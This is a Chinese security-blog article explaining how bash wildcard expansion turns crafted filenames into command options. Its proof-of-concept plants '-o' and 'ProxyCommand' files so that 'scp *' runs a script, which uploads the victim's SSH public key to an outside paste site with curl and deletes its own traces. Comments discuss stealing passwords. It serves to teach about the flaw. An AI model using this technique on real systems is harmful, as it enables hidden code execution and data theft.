@@ -1,0 +1,50 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Linux 通配符可能产生的问题</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">爱小狐狸的小螃蟹</a> <span class="bull">·</span> <time title="2014/06/24 17:37" ui-time="" datetime="2014/06/24 17:37" class="published ng-binding ng-isolate-scope">2014/06/24 17:37</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>from:https://dicesoft.net/projects/wildcard-code-execution-exploit.htm</p><h2>0x00 通配符</h2><hr><p>当你在一个bash命令行中输入“*”时，bash会扩展到当前目录的所有文件，然后将他们全部作为参数传递给程序。例如：<code>rm *</code>，将会删除掉当前目录的所有文件。</p><h2>0x01 文件名被当做参数</h2><hr><p>大多数的命令行程序受此影响。例如ls命令，当不适用任何参数时，输出是这个样子的：</p><pre><code>#!bash
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="196a6d7c69717c77596a6c697c6b41">[email&#160;protected]</a> foo]$ ls
+asdf.txt  foobar  -l
+</code></pre><p>如果你想要知道这些文件所属的组和用户，你可以通过”-l"参数来查看：</p><pre><code>#!bash
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6a191e0f1a020f042a191f1a0f1832">[email&#160;protected]</a> foo]$ ls -l
+total 0
+-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 asdf.txt
+-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 foobar
+-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 -l
+</code></pre><p>注意，有一个名字是“-l”的文件，我们试试“ls *”会发生什么。</p><pre><code>#!bash
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c8bbbcadb8a0ada688bbbdb8adba90">[email&#160;protected]</a> foo]$ ls *
+-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 asdf.txt
+-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 foobar
+</code></pre><p>与之前不同的是"ls *” 没有输出-l文件，-l文件被当做了此命令的参数。</p><p>此条命令相当于运行：</p><pre><code>#!bash
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d5a6a1b0a5bdb0bb95a6a0a5b0a78d">[email&#160;protected]</a> foo]$ ls asdf.txt foobar -l
+-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 asdf.txt
+-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 foobar  
+</code></pre><h2>0x02 安全问题</h2><hr><p>此问题可能导致一些安全问题，当有人参数当中带有一个通配符，又没有事先检查目录下的文件名称。这可能被用来攻击别人电脑。</p><p>这个问题是众所周知的，在<a href="http://seclists.org/fulldisclosure/2011/Sep/190">http://seclists.org/fulldisclosure/2011/Sep/190</a>已经有关于此问题的讨论。</p><h2>0x03 Proof of Concept Exploit</h2><hr><p>为了证明这个问题可以转化为一个任意代码执行攻击，我们尝试攻击“scp”命令，scp命令提供了-o选项，配置ssh，SSh有涉及运行命令的选项，我们可以利用这一点，让我们的脚本运行。</p><p>假设我们有一个目录的控制权限，在该目录下受害者将运行以下命令（想象一下，用户只下载一个web应用程序的源代码，并上传到他们的网络服务器上）：</p><pre><code>#!bash
+$ scp * <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ed989e889fad88958c809d8188c3829f8a">[email&#160;protected]</a>:/var/www/
+</code></pre><p>为了利用这个命令，在目录下我们需要放几个文件：</p><pre><code>"-o" - SCP 将会把这个文件当做 "-o” 参数。
+"ProxyCommand sh supercool.sh %h %p" - SCP 将会把这个文件当做 "-o" 的一个参数。
+"supercool.sh" - 这个脚本将会被执行。
+"zzz.txt" - 没有任何用处的测试文件。
+</code></pre><p>在supercool.sh文件里，有一些恶意的命令：</p><pre><code>#!bash
+#!/bin/sh
+
+# Upload their SSH public key to the Internet, and put a scary message in /tmp/.
+echo "By @DefuseSec and @redragonx..." &gt; /tmp/you-have-been-hacked.txt
+echo "This could have been your private key..." &gt;&gt; /tmp/you-have-been-hacked.txt
+curl -s -d "jscrypt=no" -d "lifetime=864000"                                \
+        -d "shorturl=yes" --data-urlencode "paste@$HOME/.ssh/id_rsa.pub"    \
+        https://defuse.ca/bin/add.php -D - |                                \
+        grep Location | cut -d " " -f 2 &gt;&gt; /tmp/you-have-been-hacked.txt
+
+# Delete evidence of our attack.
+rm ./-o ProxyCommand\ sh\ supercool.sh\ %h\ %p 
+echo &gt; ./supercool.sh
+
+# Do what ProxyCommand is supposed to do.
+nc -p 22332 -w 5 $1 $2
+</code></pre><p>当受害者执行命令时：</p><pre><code>#!bash
+$ scp * <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8bfef8eef9cbeef3eae6fbe7eea5e4f9ec">[email&#160;protected]</a>:/var/www/
+supercool.sh
+zzz.txt
+</code></pre><p>当他检查自己的/tmp目录下的时候将会看到：</p><pre><code>#!bash
+$ cat /tmp/you-have-been-hacked.txt
+By @DefuseSec and @redragonx...
+This could have been your private key...
+https://defuse.ca/b/QQ3nxADu 
+</code></pre><p>可以在这里下载完整的poc文件：<a href="http://static.wooyun.org/20141017/2014101711552836274.zip">poc.zip</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/4762" rel="bookmark" id="re1">linux symbolic link attack tutorial</a></li><li><a href="http://drops.wooyun.org/tools/1013" rel="bookmark" id="re2">密码管理利器：Linux - KeePassX</a></li><li><a href="http://drops.wooyun.org/papers/4386" rel="bookmark" id="re3">One git command may cause you hacked(CVE-2014-9390)</a></li><li><a href="http://drops.wooyun.org/tips/1288" rel="bookmark" id="re4">Linux PAM&#038;&PAM后门</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">路人甲</span> <span class="reply-time">2014-07-17 17:37:03</span></div><p></p><p>这样执行呢 scp -- * <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1c696f796e5c79647d716c707932736e7b">[email&#160;protected]</a>:/var/www/</p><p>我是路人甲，不知道scp怎么用</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">白非白</span> <span class="reply-time">2014-07-01 09:19:10</span></div><p></p><p>更多内容，请移步http://www.exploit-db.com/papers/33930</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Jea</span> <span class="reply-time">2014-06-25 11:27:30</span></div><p></p><p>并非这么简单,在Linux中,并非只有*,~-`都可以,这个甚至是不确定的,有的语言中可以作为声明,这个时候就悲剧了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">动后河</span> <span class="reply-time">2014-06-25 01:26:31</span></div><p></p><p>恶意脚本可以用来偷scp密码！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mramydnei</span> <span class="reply-time">2014-06-24 19:22:26</span></div><p></p><p>很有意思～ 不过更像是个backdoor</p><p>第一感觉耍起来是不是得和.bash_history多挂点钩<br>观察用户习惯又或者篡改什么的（喜欢up up 回车的，估计得躺枪） 不过感觉这么利用还是没到点子上</p><p>楼下怎么看？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-06-24 17:41:02</span></div><p></p><p>一个蛮有意思的点，攻击场景你能想到哪些？</p><p></p></div></div></div></div></div></main>
